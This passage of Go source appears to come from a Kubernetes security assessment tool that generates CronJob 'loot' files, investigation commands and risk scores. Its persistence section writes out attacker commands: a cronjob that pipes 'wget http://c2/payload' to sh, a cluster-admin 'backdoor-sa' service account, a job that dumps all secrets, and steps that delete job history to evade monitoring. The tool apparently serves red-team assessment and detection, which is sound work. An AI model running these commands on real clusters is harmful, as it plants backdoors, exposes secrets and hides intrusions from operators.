	persistLines = append(persistLines, "# 3. Low-frequency execution (weekly)")
	persistLines = append(persistLines, "kubectl create cronjob weekly-maint -n default --image=alpine --schedule=\"0 2 * * 0\" -- sh -c 'wget http://c2/payload | sh'\n")

	persistLines = append(persistLines, "\n=== RBAC-BASED PERSISTENCE ===\n")
	persistLines = append(persistLines, "# 1. Create ServiceAccount with cluster-admin")
	persistLines = append(persistLines, "kubectl create sa backdoor-sa -n default")
	persistLines = append(persistLines, "kubectl create clusterrolebinding backdoor-admin --clusterrole=cluster-admin --serviceaccount=default:backdoor-sa\n")

	persistLines = append(persistLines, "# 2. Create cronjob using privileged SA")
	persistLines = append(persistLines, "cat <<EOF | kubectl apply -f -")
	persistLines = append(persistLines, "apiVersion: batch/v1")
	persistLines = append(persistLines, "kind: CronJob")
	persistLines = append(persistLines, "metadata:")
	persistLines = append(persistLines, "  name: admin-task")
	persistLines = append(persistLines, "  namespace: default")
	persistLines = append(persistLines, "spec:")
	persistLines = append(persistLines, "  schedule: \"0 3 * * *\"")
	persistLines = append(persistLines, "  jobTemplate:")
	persistLines = append(persistLines, "    spec:")
	persistLines = append(persistLines, "      template:")
	persistLines = append(persistLines, "        spec:")
	persistLines = append(persistLines, "          serviceAccountName: backdoor-sa")
	persistLines = append(persistLines, "          containers:")
	persistLines = append(persistLines, "          - name: task")
	persistLines = append(persistLines, "            image: bitnami/kubectl:latest")
	persistLines = append(persistLines, "            command: [\"kubectl\", \"get\", \"secrets\", \"-A\"]")
	persistLines = append(persistLines, "          restartPolicy: OnFailure")
	persistLines = append(persistLines, "EOF\n")

	persistLines = append(persistLines, "\n=== MONITORING EVASION ===\n")
	persistLines = append(persistLines, "# Delete completed jobs to hide activity")
	persistLines = append(persistLines, "kubectl delete jobs -n <namespace> --field-selector status.successful=1\n")

	persistLines = append(persistLines, "# Disable job history retention")
	persistLines = append(persistLines, "kubectl patch cronjob <name> -n <namespace> -p '{\"spec\":{\"successfulJobsHistoryLimit\":0,\"failedJobsHistoryLimit\":0}}'\n")

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "CronJob-Persistence",
		Contents: strings.Join(persistLines, "\n"),
	})

	// 5. CronJob-Commands: Useful investigation commands
	var cmdLines []string
	cmdLines = append(cmdLines, "########################################")
	cmdLines = append(cmdLines, "##### CronJob Investigation Commands")
	cmdLines = append(cmdLines, "########################################\n")

	cmdLines = append(cmdLines, "=== CRONJOB ANALYSIS ===\n")
	cmdLines = append(cmdLines, "# List all cronjobs with their schedules")
	cmdLines = append(cmdLines, "kubectl get cronjobs -A -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,SCHEDULE:.spec.schedule,SUSPEND:.spec.suspend,ACTIVE:.status.active,LAST-SCHEDULE:.status.lastScheduleTime\n")

	cmdLines = append(cmdLines, "# Find cronjobs running every minute (crypto miner pattern)")
	cmdLines = append(cmdLines, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.schedule == \"* * * * *\") | \"\\(.metadata.namespace)/\\(.metadata.name)\"'\n")

	cmdLines = append(cmdLines, "# Find cronjobs with privileged containers")
	cmdLines = append(cmdLines, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.jobTemplate.spec.template.spec.containers[]?.securityContext?.privileged == true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'\n")

	cmdLines = append(cmdLines, "# Find cronjobs with hostPID/hostIPC/hostNetwork")
	cmdLines = append(cmdLines, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.jobTemplate.spec.template.spec.hostPID == true or .spec.jobTemplate.spec.template.spec.hostIPC == true or .spec.jobTemplate.spec.template.spec.hostNetwork == true) | \"\\(.metadata.namespace)/\\(.metadata.name) - hostPID:\\(.spec.jobTemplate.spec.template.spec.hostPID) hostIPC:\\(.spec.jobTemplate.spec.template.spec.hostIPC) hostNetwork:\\(.spec.jobTemplate.spec.template.spec.hostNetwork)\"'\n")

	cmdLines = append(cmdLines, "# Find cronjobs with hostPath volumes")
	cmdLines = append(cmdLines, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.jobTemplate.spec.template.spec.volumes[]?.hostPath != null) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'\n")

	cmdLines = append(cmdLines, "\n=== JOB ANALYSIS ===\n")
	cmdLines = append(cmdLines, "# List all jobs created by cronjobs")
	cmdLines = append(cmdLines, "kubectl get jobs -A --show-labels\n")

	cmdLines = append(cmdLines, "# Get logs from most recent job")
	cmdLines = append(cmdLines, "kubectl logs -n <namespace> job/<job-name>\n")

	cmdLines = append(cmdLines, "# List failed jobs")
	cmdLines = append(cmdLines, "kubectl get jobs -A --field-selector status.successful!=1\n")

	cmdLines = append(cmdLines, "\n=== SPECIFIC CRONJOB INVESTIGATIONS ===\n")

	for _, f := range append(critical, high...) {
		cmdLines = append(cmdLines, fmt.Sprintf("\n# %s/%s (Risk: %s)", f.Namespace, f.Name, f.RiskLevel))
		cmdLines = append(cmdLines, fmt.Sprintf("kubectl get cronjob -n %s %s -o yaml", f.Namespace, f.Name))
		cmdLines = append(cmdLines, fmt.Sprintf("kubectl get jobs -n %s -l batch.kubernetes.io/controller-uid", f.Namespace))
		cmdLines = append(cmdLines, fmt.Sprintf("kubectl describe cronjob -n %s %s", f.Namespace, f.Name))

		if len(f.BackdoorPatterns) > 0 {
			cmdLines = append(cmdLines, fmt.Sprintf("# THREAT: %s", strings.Join(f.BackdoorPatterns, ", ")))
		}
	}

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "CronJob-Commands",
		Contents: strings.Join(cmdLines, "\n"),
	})

	return lootFiles
}

// calculateCronJobRiskScore calculates a numeric risk score (0-100)
func calculateCronJobRiskScore(finding CronJobFinding, scheduleRisk string) int {
	score := 0

	// Backdoors and malicious activity (50 points max)
	if len(finding.ReverseShells) > 0 {
		score += 50
	}
	if len(finding.CryptoMiners) > 0 {
		score += 50
	}
	if len(finding.DataExfiltration) > 0 {
		score += 30
	}
	if len(finding.ContainerEscape) > 0 {
		score += 40
	}

	// Privileged access (25 points max)
	if finding.Privileged {
		score += 20
	}
	if finding.HostPID {
		score += 15
	}
	if finding.HostIPC {
		score += 10
	}
	if finding.HostNetwork {
		score += 15
	}

	// Dangerous hostPaths (20 points max)
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			score += 20
			break
		} else if hp == "/" || hp == "/:" {
			score += 15
			break
		} else {
			score += 5
		}
	}

	// Schedule-based risk (20 points max)
	switch scheduleRisk {
	case "CRITICAL":
		score += 20
	case "HIGH":
		score += 15
	case "MEDIUM":
		score += 10
	case "LOW":
		score += 5
	}

	// Concurrency policy risk (10 points)
	if finding.ConcurrencyPolicy == "Allow" {
		score += 10
	}

	// Cloud role with high privileges (10 points)
	if finding.CloudRole != "" && (strings.Contains(strings.ToLower(finding.CloudRole), "admin") ||
		strings.Contains(strings.ToLower(finding.CloudRole), "cluster")) {
		score += 10
	}

	// Not suspended but has issues (5 points)
	if !finding.Suspend && (len(finding.BackdoorPatterns) > 0 || finding.Privileged) {
		score += 5
	}

	// Cap at 100
	if score > 100 {
		score = 100
	}

	return score
}

// generateCronJobSecurityIssues creates a list of specific security issues and recommendations
func generateCronJobSecurityIssues(finding CronJobFinding, scheduleRisk string) []string {
	var issues []string

	// Critical malicious activity
	if len(finding.ReverseShells) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Reverse shell patterns detected: %s - scheduled backdoor execution", strings.Join(finding.ReverseShells, ", ")))
	}
	if len(finding.CryptoMiners) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Crypto mining patterns detected: %s - scheduled resource abuse", strings.Join(finding.CryptoMiners, ", ")))
	}
	if len(finding.DataExfiltration) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Data exfiltration patterns: %s - scheduled data theft", strings.Join(finding.DataExfiltration, ", ")))
	}
	if len(finding.ContainerEscape) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Container escape techniques: %s - scheduled node compromise", strings.Join(finding.ContainerEscape, ", ")))
	}

	// Schedule-based risks
	if scheduleRisk == "CRITICAL" {
		issues = append(issues, fmt.Sprintf("CRITICAL: Very frequent schedule (%s) - %s - potential DoS or aggressive attack", finding.Schedule, finding.ScheduleAnalysis))
	} else if scheduleRisk == "HIGH" {
		issues = append(issues, fmt.Sprintf("HIGH: Frequent schedule (%s) - %s - review necessity", finding.Schedule, finding.ScheduleAnalysis))
	} else if scheduleRisk == "MEDIUM" {
		issues = append(issues, fmt.Sprintf("MEDIUM: Moderate schedule (%s) - %s", finding.Schedule, finding.ScheduleAnalysis))
	}

	// Privileged access
	if finding.Privileged {
		issues = append(issues, "HIGH: Privileged CronJob - scheduled jobs have kernel access")
	}
	if finding.HostPID {
		issues = append(issues, "HIGH: hostPID enabled - scheduled jobs can view/kill host processes")
	}
	if finding.HostIPC {
		issues = append(issues, "MEDIUM: hostIPC enabled - scheduled jobs can access host IPC")
	}
	if finding.HostNetwork {
		issues = append(issues, "MEDIUM: hostNetwork enabled - scheduled jobs on host network")
	}

	// Dangerous hostPath mounts
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			issues = append(issues, fmt.Sprintf("CRITICAL: Container runtime socket mounted (%s) - scheduled cluster admin access", hp))
		} else if hp == "/" || hp == "/:" {
			issues = append(issues, "CRITICAL: Root filesystem mounted - scheduled complete node access")
		} else if strings.Contains(hp, "/var/run") {
			issues = append(issues, fmt.Sprintf("HIGH: Sensitive path mounted: %s - review necessity", hp))
		} else {
			issues = append(issues, fmt.Sprintf("MEDIUM: HostPath volume: %s", hp))
		}
	}

	// Concurrency policy
	if finding.ConcurrencyPolicy == "Allow" {
		issues = append(issues, "MEDIUM: Concurrency policy 'Allow' - multiple jobs can run simultaneously (resource exhaustion risk)")
	}

	// Suspension status
	if finding.Suspend {
		issues = append(issues, "INFO: CronJob is suspended - not currently running")
	} else if len(finding.BackdoorPatterns) > 0 {
		issues = append(issues, "CRITICAL: Malicious CronJob is ACTIVE - executing on schedule")
	}

	// Cloud IAM role
	if finding.CloudRole != "" {
		if strings.Contains(strings.ToLower(finding.CloudRole), "admin") {
			issues = append(issues, fmt.Sprintf("HIGH: Cloud admin role assigned: %s - scheduled jobs have elevated cloud permissions", finding.CloudRole))
		} else {
			issues = append(issues, fmt.Sprintf("LOW: Cloud IAM role: %s - verify least privilege for scheduled tasks", finding.CloudRole))
		}
	}

	// Service account
	if finding.ServiceAccount == "default" {
		issues = append(issues, "LOW: Using default service account - should use dedicated ServiceAccount for scheduled jobs")
	}

	// Job history
	if finding.FailedJobsHistory > 5 {
		issues = append(issues, fmt.Sprintf("MEDIUM: High failed job count (%d) - investigate failures", finding.FailedJobsHistory))
	}

	// No issues found
	if len(issues) == 0 {
		issues = append(issues, "LOW: Standard CronJob configuration - no obvious security issues")
	}

	return issues
}
